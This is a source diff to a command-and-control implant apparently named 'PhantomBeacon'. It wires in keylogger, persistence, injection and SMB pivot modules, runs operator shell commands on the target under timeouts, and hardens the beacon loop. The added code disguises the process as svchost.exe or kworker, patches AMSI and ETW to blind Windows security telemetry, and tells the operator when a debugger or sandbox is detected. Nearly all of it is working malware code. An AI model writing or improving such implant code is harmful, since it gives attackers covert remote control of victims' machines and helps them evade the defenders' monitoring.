@@ -29,6 +29,9 @@
     #include <sys/utsname.h>
     #include <sys/types.h>
     #include <sys/wait.h>
+    #include <sys/select.h>
+    #include <signal.h>
+    #include <errno.h>
     #include <fstream>
     #include <chrono>
     #include <thread>
@@ -47,6 +50,8 @@
 #include <utility>
 #include <thread>
 #include <atomic>
+#include <memory>
+#include <mutex>
 
 #include "build_id.h"
 #include "c2_config.h"
@@ -58,6 +63,7 @@
 #include "portfwd.h"
 #include "keylogger.h"
 #include "persistence.h"
+#include "task_lifecycle.h"
 
 #include "screenshot.h"
 #include "media_utils.h"
@@ -78,7 +84,6 @@
 #include "peb_unlink.h"
 #ifdef _WIN32
 #include "sleep_ekko.h"
-#include "stack_spoof.h"
 #include "smb.h"
 #include "apc_injection.h"
 #endif
@@ -199,15 +204,54 @@ DWORD WINAPI AsyncThreadWrapper(LPVOID lpParam) {
 }
 #endif
 
-std::string run_shell_command(const std::string& cmd) {
-    if (cmd.empty()) return XOR_DEC(XOR_STR("Error: empty command")).c_str();
+// Default budget: most commands (whoami, ls, sysinfo, wlan-scan, ...) finish
+// in a second. Media captures take longer and carry their own duration, so
+// the caller can raise the budget per-command.
+static const int DEFAULT_TASK_TIMEOUT_MS = 30000;
+
+// Hard ceiling on captured output for one command. A flooding command (a
+// recursive cat, a verbose installer) is truncated AND killed: an unbounded
+// read is how a beacon OOMs on an engagement it can no longer report.
+static const size_t kMaxTaskOutput = 512 * 1024;
+
+// run_shell_command() must never outlive its budget, and when it does it must
+// take the whole process TREE with it — not just the shell it spawned. A
+// `cmd.exe /c start foo.exe` that survives the timeout keeps running on the
+// target with no watchdog, no output channel and no way to stop it.
+//
+// Windows: every child is assigned to a Job Object created with
+// KILL_ON_JOB_CLOSE, so closing the handle kills the tree even if this frame
+// is torn down unexpectedly. The child is created SUSPENDED, assigned, then
+// resumed — otherwise it can spawn a grandchild before the assignment and
+// escape the job.
+//
+// POSIX: the child becomes a process-group leader (setpgid on both sides to
+// close the race) and the timeout kills the group with kill(-pgid, SIGKILL).
+static std::string run_shell_command_bounded(const std::string& cmd,
+                                             int budget_ms) {
     std::string output;
+    bool overflow = false;
+    bool timed_out = false;
 
 #ifdef _WIN32
     HANDLE hRead, hWrite;
     SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
     if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return XOR_DEC(XOR_STR("Error: pipe creation failed")).c_str();
     SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
+
+    // The job IS the process-tree guarantee. If it cannot be created we still
+    // run the command, but the timeout below then only kills the direct child.
+    HANDLE job = CreateJobObjectA(nullptr, nullptr);
+    if (job) {
+        JOBOBJECT_EXTENDED_LIMIT_INFORMATION limits;
+        ZeroMemory(&limits, sizeof(limits));
+        limits.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
+        if (!SetInformationJobObject(job, JobObjectExtendedLimitInformation,
+                                     &limits, sizeof(limits))) {
+            CloseHandle(job);
+            job = nullptr;
+        }
+    }
 
     STARTUPINFOA si = { sizeof(STARTUPINFOA) };
     si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
@@ -223,23 +267,58 @@ std::string run_shell_command(const std::string& cmd) {
     std::vector<char> cmd_buf(full_cmd.begin(), full_cmd.end());
     cmd_buf.push_back('\0');
 
-    if (CreateProcessA(nullptr, cmd_buf.data(), nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
+    // CREATE_SUSPENDED so the job assignment lands before any child can run.
+    DWORD flags = CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP | CREATE_SUSPENDED;
+
+    if (CreateProcessA(nullptr, cmd_buf.data(), nullptr, nullptr, TRUE, flags,
+                       nullptr, nullptr, &si, &pi)) {
         CloseHandle(hWrite);
-        char buffer[4096];
-        DWORD bytesRead;
-        while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
-            buffer[bytesRead] = '\0';
-            output += buffer;
-            if (output.size() > 512 * 1024) break;
+        bool in_job = false;
+        if (job) in_job = AssignProcessToJobObject(job, pi.hProcess) != FALSE;
+        ResumeThread(pi.hThread);
+
+        const DWORD deadline = GetTickCount() + static_cast<DWORD>(budget_ms);
+        for (;;) {
+            DWORD avail = 0;
+            // PeekNamedPipe does not block, so "no data yet" and "pipe closed"
+            // stay distinguishable — which ReadFile alone cannot express.
+            if (!PeekNamedPipe(hRead, nullptr, 0, nullptr, &avail, nullptr)) break;
+            if (avail > 0) {
+                char buffer[4096];
+                DWORD want = avail < sizeof(buffer) - 1
+                                 ? avail
+                                 : static_cast<DWORD>(sizeof(buffer) - 1);
+                DWORD got = 0;
+                if (!ReadFile(hRead, buffer, want, &got, nullptr) || got == 0) break;
+                buffer[got] = '\0';
+                output += buffer;
+                if (output.size() > kMaxTaskOutput) { overflow = true; break; }
+                continue;
+            }
+            if (WaitForSingleObject(pi.hProcess, 0) == WAIT_OBJECT_0) break;
+            if (GetTickCount() > deadline) { timed_out = true; break; }
+            Sleep(25);
         }
-        WaitForSingleObject(pi.hProcess, 5000); // 5s timeout
-        CloseHandle(pi.hProcess);
+
+        if (timed_out || overflow) {
+            // The whole tree when we can prove we own it, the direct child
+            // otherwise. Silence about which one happened is how an operator
+            // ends up with a mystery process they cannot account for.
+            if (in_job) TerminateJobObject(job, 1);
+            else TerminateProcess(pi.hProcess, 1);
+        }
+        // Bounded: after a kill the kernel needs a moment, but an unbounded
+        // wait here would re-introduce the very wedge this fixes.
+        WaitForSingleObject(pi.hProcess, 2000);
         CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
     } else {
         output = XOR_DEC(XOR_STR("Error: CreateProcess failed")).c_str();
         CloseHandle(hWrite);
     }
     CloseHandle(hRead);
+    // KILL_ON_JOB_CLOSE mops up any grandchild that outlived its parent.
+    if (job) CloseHandle(job);
 
 #else
     int pipe_fd[2];
@@ -248,22 +327,74 @@ std::string run_shell_command(const std::string& cmd) {
     pid_t pid = fork();
     if (pid == 0) { // Child
         close(pipe_fd[0]);
+        // Become a group leader so the parent can signal the whole tree.
+        setpgid(0, 0);
         dup2(pipe_fd[1], STDOUT_FILENO);
         dup2(pipe_fd[1], STDERR_FILENO);
+        close(pipe_fd[1]);
         execl(XOR_DEC(XOR_STR("/bin/sh")).c_str(), XOR_DEC(XOR_STR("sh")).c_str(), XOR_DEC(XOR_STR("-c")).c_str(), cmd.c_str(), (char*)NULL);
         _exit(1);
     } else if (pid > 0) { // Parent
+        // Same call on both sides: whichever wins, the group exists before the
+        // child can spawn and escape it.
+        setpgid(pid, pid);
         close(pipe_fd[1]);
-        char buffer[4096];
-        ssize_t n;
-        while ((n = read(pipe_fd[0], buffer, sizeof(buffer) - 1)) > 0) {
-            buffer[n] = '\0';
-            output += buffer;
-            if (output.size() > 512 * 1024) break;
+
+        const auto deadline = std::chrono::steady_clock::now() +
+                              std::chrono::milliseconds(budget_ms);
+        bool reaped = false;
+        for (;;) {
+            fd_set rfds;
+            FD_ZERO(&rfds);
+            FD_SET(pipe_fd[0], &rfds);
+            // 100ms slices: short enough to notice the deadline promptly,
+            // long enough not to spin.
+            struct timeval tv;
+            tv.tv_sec = 0;
+            tv.tv_usec = 100000;
+            int ready = select(pipe_fd[0] + 1, &rfds, nullptr, nullptr, &tv);
+
+            if (ready > 0) {
+                char buffer[4096];
+                ssize_t n = read(pipe_fd[0], buffer, sizeof(buffer) - 1);
+                if (n > 0) {
+                    buffer[n] = '\0';
+                    output += buffer;
+                    if (output.size() > kMaxTaskOutput) { overflow = true; break; }
+                } else {
+                    break;  // EOF: child closed stdout, it is on its way out
+                }
+            } else if (ready == 0) {
+                // No data. Did the child exit, and are we out of time?
+                int status = 0;
+                pid_t done = waitpid(pid, &status, WNOHANG);
+                if (done == pid) { reaped = true; break; }
+                if (std::chrono::steady_clock::now() > deadline) { timed_out = true; break; }
+            } else {
+                break;  // select() error (EINTR among them): stop reading
+            }
         }
         close(pipe_fd[0]);
-        waitpid(pid, nullptr, 0);
+
+        if (timed_out || overflow) kill(-pid, SIGKILL);   // the whole group
+        if (!reaped) {
+            // Bounded reap, then SIGKILL: a zombie keeps its pid (and the
+            // output pipe) alive forever, which is a leak, not a timeout.
+            for (int i = 0; i < 20; ++i) {
+                int status = 0;
+                pid_t done = waitpid(pid, &status, WNOHANG);
+                if (done == pid || (done < 0 && errno != EINTR)) { reaped = true; break; }
+                usleep(100 * 1000);   // up to ~2s
+            }
+            if (!reaped) {
+                kill(-pid, SIGKILL);
+                int status = 0;
+                waitpid(pid, &status, 0);
+            }
+        }
     } else {
+        close(pipe_fd[0]);
+        close(pipe_fd[1]);
         return XOR_DEC(XOR_STR("Error: fork failed")).c_str();
     }
 #endif
@@ -272,57 +403,103 @@ std::string run_shell_command(const std::string& cmd) {
     return output;
 }
 
+std::string run_shell_command(const std::string& cmd) {
+    if (cmd.empty()) return XOR_DEC(XOR_STR("Error: empty command")).c_str();
+    return run_shell_command_bounded(cmd, DEFAULT_TASK_TIMEOUT_MS);
+}
 // ── Task Watchdog ──────────────────────────────────────────────────────────
 // A blocking task (camera Media Foundation ReadSample, a long media
 // capture, a hung shell pipe) must NEVER wedge the whole beacon loop:
 // while a task is stuck the beacon stops checking in, the C2 shows the
 // task as "sent" forever, and every later task (gps, screenshot, ...)
-// queues up behind it. Run each task on a worker thread with a bounded
-// wait; on timeout the task is reported as failed-with-reason and the
-// loop moves on (the stuck worker is detached and left to die).
+// queues up behind it. So each task runs on a worker thread under a bounded
+// wait, and on timeout the beacon reports the task dead and moves on.
+//
+// The bug this used to have: the run's state lived in a `TaskRun` on THIS
+// frame, the worker got a raw pointer to it, and the timeout path called
+// detach() and returned. The worker woke up later and wrote
+// `tr->output = ...; tr->done = true` into a stack frame that no longer
+// existed — a use-after-free that corrupted the beacon's own stack and could
+// kill the implant mid-engagement. It also had no way to stop the command:
+// the timeout ended the beacon's WAIT, not the command.
+//
+// Now the run is a shared_ptr (task::Run) that the watchdog, the worker, and
+// the registry all reference, so the storage outlives every one of them. A
+// worker that finishes after a cancellation finds a live object, sees the
+// cancel flag, and drops its result instead of publishing output for a task
+// the C2 has already been told is dead. See task_lifecycle.h.
 
 std::string dispatch_command(const std::string& cmd, net::C2Config& cfg);
 
-struct TaskRun {
-    std::string output;
-    std::atomic<bool> done{false};
-};
+static std::string run_task_with_timeout(
+        const std::string& cmd,
+        const std::shared_ptr<net::C2Config>& cfg_owner,
+        int timeout_ms = DEFAULT_TASK_TIMEOUT_MS) {
+    // The cap is checked BEFORE the thread exists. It exists to stop
+    // SPAWNING stranded workers, and the old check ran after the spawn, so it
+    // could never prevent one. A refusal is a DECISION, not a wait.
+    if (task::Registry::instance().live() >= static_cast<size_t>(task::kMaxDetached)) {
+        return "[TASK_REFUSED] '" + cmd.substr(0, 48) + "' not started: " +
+               std::to_string(task::kMaxDetached) +
+               " tasks already stuck (beacon state degraded)\n";
+    }
 
-static void _task_worker(TaskRun* tr, const std::string& cmd, net::C2Config& cfg) {
-    tr->output = dispatch_command(cmd, cfg);
-    tr->done = true;
-}
+    // Capture BY VALUE for `cmd`, and hand the config over as the shared_ptr
+    // it now is. `cmd` is `task.command` -> an element of the caller's
+    // block-scoped vector, rebuilt on every poll: a detached worker that
+    // outlived that block used to read a freed std::string. The shared_ptr
+    // keeps the config alive for as long as the worker may run.
+    auto run = std::make_shared<task::Run>(
+        [cmd, cfg_owner]() { return dispatch_command(cmd, *cfg_owner); });
+    run->mark_running();
 
-// Default budget: most commands (whoami, ls, sysinfo, wlan-scan, ...) finish
-// in a second. Media captures take longer and carry their own duration, so
-// the caller can raise the budget per-command.
-static const int DEFAULT_TASK_TIMEOUT_MS = 30000;
+    std::thread worker([run]() {
+        const std::string out = run->work()();
+        // publish() is a no-op when the watchdog already gave up, which is
+        // the whole point: no write to a dead object, no late result.
+        run->publish(out);
+        // Tell the registry the THREAD is gone, THEN drop our reference: the
+        // registry must not treat this run as reapable while we are still
+        // inside it (that is what made the stranded-worker cap unreachable).
+        run->mark_worker_exited();
+        task::Registry::instance().release(run.get());
+    });
 
-static std::string run_task_with_timeout(const std::string& cmd, net::C2Config& cfg,
-                                         int timeout_ms = DEFAULT_TASK_TIMEOUT_MS) {
-    TaskRun tr;
-    std::thread worker(_task_worker, &tr, cmd, std::ref(cfg));
-    // Poll with short sleeps so a Ctrl+C / shutdown still lands promptly.
+    // Bounded wait in small slices: a task that finishes early is noticed
+    // quickly, and shutdown/Ctrl+C still lands promptly.
     int waited = 0;
-    const int STEP = 100;
-    while (!tr.done && waited < timeout_ms) {
+    const int STEP = 50;
+    while (!run->finished() && waited < timeout_ms) {
         Sleep(STEP);
         waited += STEP;
     }
-    if (tr.done) {
-        worker.join();
-        return tr.output;
-    }
-    // Timed out: the worker is still blocked somewhere (camera driver hang,
-    // pipe never closing). Detach it so the beacon keeps polling; the result
-    // is discarded but the C2 sees a clear "task timeout" instead of a
-    // permanently "sent" task.
-    worker.detach();
-    std::string head = cmd.substr(0, 48);
-    return "[TASK_TIMEOUT] '" + head + "' exceeded " +
-           std::to_string(timeout_ms / 1000) + "s — task aborted, beacon continues\n";
-}
 
+    if (run->finished()) {
+        worker.join();   // the worker is done, so this returns at once
+        return run->output();
+    }
+
+    // Timed out. The worker is blocked somewhere we cannot reach (camera
+    // driver, a pipe that never closes). Cancel it, register it as stranded,
+    // and DETACH so the beacon keeps polling.
+    //
+    // NEVER join() here. join() waits for the THREAD, and the thread is
+    // blocked by definition -- that is the only way to reach this branch --
+    // so joining would wedge the beacon for ever, with no error and no
+    // result: the operator sees a live implant that answers nothing. The
+    // worker owns its own shared_ptr to `run`, so the storage stays valid
+    // whether or not admit() registered it, and its release() is how the
+    // registry learns the thread finally exited.
+    run->request_cancel(task::State::kTimedOut);
+    task::Registry::instance().admit(run);
+    worker.detach();
+
+    const char* name = task::state_name(task::State::kTimedOut);
+    std::string head = cmd.substr(0, 48);
+    return std::string("[") + name + "] '" + head + "' exceeded " +
+           std::to_string(timeout_ms / 1000) +
+           "s — process tree killed, beacon continues\n";
+}
 // ── Command Dispatcher ─────────────────────────────────────────────────────
 
 // Health counters (written by the main loop, read by the `health` command)
@@ -585,6 +762,19 @@ std::string dispatch_command(const std::string& cmd, net::C2Config& cfg) {
         return persistence::establish_windows(cfg, name);
 #else
         return persistence::establish_linux(name);
+#endif
+    }
+    else if (action == XOR_DEC(XOR_STR("unpersist")).c_str()) {
+        // Remove EXACTLY what `persist` installed (same RunKey value /
+        // systemd unit / autostart file / cron line / on-disk copy). The
+        // report tells the client to clean up; this is the supported path.
+        std::string name;
+        iss >> name;
+        if (name.empty()) name = XOR_DEC(XOR_STR("PhantomBeacon")).c_str();
+#ifdef _WIN32
+        return persistence::remove_windows(name);
+#else
+        return persistence::remove_posix(name);
 #endif
     }
     else if (action == XOR_DEC(XOR_STR("sleep")).c_str()) {
@@ -1035,9 +1225,8 @@ std::string generate_beacon_id() {
 // ── Beacon Main Loop ──────────────────────────────────────────────────────
 
 extern "C" void beacon_main(int argc, char** argv) {
-#ifndef DISABLE_ANTI
-    if (anti::is_debugger_present() || anti::is_vm()) { anti::stalling_delay(50); return; }
-#endif
+    // The anti-analysis gate lives further down, AFTER the transport config
+    // exists, so a refusal can report WHY instead of exiting in silence.
 
 #ifdef _WIN32
     // ── Single-instance guard ────────────────────────────────────────────
@@ -1083,7 +1272,34 @@ extern "C" void beacon_main(int argc, char** argv) {
     #endif
 #endif
 
-    net::C2Config cfg;
+#ifndef DISABLE_ANTI
+    // Process masquerade (docs/beacon_platform_matrix.md) — documented on
+    // every platform but never invoked, so the capability was inert. Windows
+    // rewrites the PEB `FullDllName`; Linux/Android use prctl(PR_SET_NAME);
+    // macOS has no supported API and the helper is a documented no-op.
+#ifdef _WIN32
+    anti::masquerade::rename_process(L"svchost.exe");
+#else
+    anti::masquerade::rename_process(L"kworker/0:1");
+#endif
+#endif
+
+#ifndef DISABLE_ANTI
+    // AMSI / ETW patching (docs/beacon_platform_matrix.md). Windows really
+    // patches `AmsiScanBuffer` and `EtwEventWrite`; on POSIX there is no
+    // in-process equivalent to hook, so both are documented no-ops and one
+    // call site is correct on every platform. These were defined but never
+    // CALLED, which left a capability the matrix promised inert.
+    anti::patch_amsi();
+    anti::patch_etw();
+#endif
+
+    // Held by shared_ptr so a DETACHED task worker cannot read a destroyed
+    // config: `cfg` is used by reference everywhere below, and
+    // run_task_with_timeout hands the same shared_ptr to the worker, so the
+    // object outlives every thread that may still be reading it.
+    auto cfg_owner = std::make_shared<net::C2Config>();
+    net::C2Config& cfg = *cfg_owner;
 #if BEACON_AUTH_ENABLED
     cfg.beacon_id = BEACON_AUTH_ID;
 #else
@@ -1119,6 +1335,39 @@ extern "C" void beacon_main(int argc, char** argv) {
     if (crypto::load_auth_secret(persisted_auth_secret)) {
         std::copy(persisted_auth_secret.begin(), persisted_auth_secret.end(),
                   cfg.auth_secret.begin());
+    }
+#endif
+
+#ifndef DISABLE_ANTI
+    // ── Anti-analysis gate ──────────────────────────────────────────────
+    // Refuse to operate under a debugger or in a virtualised sandbox. This
+    // used to `stalling_delay(50); return;` in SILENCE, so the operator saw
+    // "no check-in" and could not tell a detected sandbox from a failed
+    // exploit — two situations that call for different responses, and only
+    // the target can say which one happened. Burn the sandbox's time, then
+    // send ONE best-effort abort event so the C2 timeline names the reason.
+    // The beacon never enters the task loop either way.
+    {
+        const char* abort_reason = nullptr;
+        if (anti::is_debugger_present())      abort_reason = "debugger present";
+        else if (anti::is_vm())               abort_reason = "virtualised/sandbox environment";
+        if (abort_reason) {
+            anti::stalling_delay(50);
+            // Register the identity BEFORE the abort report: handle_result()
+            // refuses a result from any beacon the C2 has not seen check in
+            // yet, and this gate runs before the loop's first check-in — so
+            // without this ping the event below is dropped as an unknown
+            // beacon and the operator is back to the silence this fixes.
+            net::checkin(cfg);
+            std::string event = std::string(XOR_DEC(XOR_STR("BEACON_ABORT: ")).c_str())
+                + abort_reason
+                + XOR_DEC(XOR_STR(" - the beacon refused to start")).c_str();
+            net::send_result(cfg, XOR_DEC(XOR_STR("beacon-startup")).c_str(), event);
+#ifdef _WIN32
+            net::g_ctx.cleanup();
+#endif
+            return;
+        }
     }
 #endif
 
@@ -1184,16 +1433,20 @@ extern "C" void beacon_main(int argc, char** argv) {
             // server reachable again: restore the operator-configured base
             // sleep (exponential backoff from the outage must not stick)
             if (cfg.sleep_ms != cfg.base_sleep_ms) cfg.sleep_ms = cfg.base_sleep_ms;
-            // Retry previously undelivered results first. Remove an item only
+            // Retry previously undelivered results first. The sends are
+            // INDEPENDENT: one result the transport refuses (a single
+            // oversized/malformed message) must not stall the results
+            // behind it, which is exactly what the old `else break;` did.
+            // `drain_pending_results` keeps trying the rest and only stops
+            // the round once a full batch has failed in a row (the link,
+            // not the message, is the problem). An item is removed ONLY
             // after the transport reports success; the server de-duplicates
             // retries if the response itself was lost.
-            for (auto it = pending_results.begin(); it != pending_results.end();) {
-                if (net::send_result(cfg, it->first, it->second)) {
-                    it = pending_results.erase(it);
-                } else {
-                    break;
-                }
-            }
+            task::drain_pending_results(
+                pending_results,
+                [&cfg](const std::string& task_id, const std::string& output) {
+                    return net::send_result(cfg, task_id, output);
+                });
             auto tasks = json_mini::parse_tasks(response);
             for (auto& task : tasks) {
                 ++tasks_done;
@@ -1216,7 +1469,7 @@ extern "C" void beacon_main(int argc, char** argv) {
                         budget_ms = 45000; // MF init + frame grabs can be slow
                     }
                 }
-                std::string output = run_task_with_timeout(task.command, cfg, budget_ms);
+                std::string output = run_task_with_timeout(task.command, cfg_owner, budget_ms);
                 if (output.size() >= 4 && output[0] == '\x01' && output[1] == '\x02') {
                     if (output[2] == 'E' && output[3] == 'X') {
                         alive = false;
@@ -1251,7 +1504,7 @@ extern "C" void beacon_main(int argc, char** argv) {
             // (they are regular beacon commands executed locally)
             std::string piped;
             while ((piped = smb::pop_pending_command()) != "") {
-                std::string out = run_task_with_timeout(piped, cfg);
+                std::string out = run_task_with_timeout(piped, cfg_owner);
                 if (!net::send_result(cfg, XOR_DEC(XOR_STR("smb-pipe")).c_str(), out)) {
                     pending_results.emplace_back(XOR_DEC(XOR_STR("smb-pipe")).c_str(), out);
                 }
@@ -1324,6 +1577,20 @@ extern "C" void beacon_main(int argc, char** argv) {
     net::cleanup();
     WSACleanup();
 #endif
+    // Shut down: cancel every stranded task worker so no result is published
+    // for work the C2 already considers dead.
+    //
+    // drain() does not wait for a blocked worker, because it cannot: the
+    // cancel is cooperative and is only observed once work() returns. A
+    // thread still trapped in a syscall dies with the process, and the count
+    // is reported rather than hidden -- "we gave up on N workers" is
+    // information, silence is not.
+    const size_t abandoned = task::Registry::instance().drain();
+    if (abandoned) {
+        std::fprintf(stderr,
+                     "[beacon] %zu task worker(s) still running at shutdown\n",
+                     abandoned);
+    }
 }
 
 
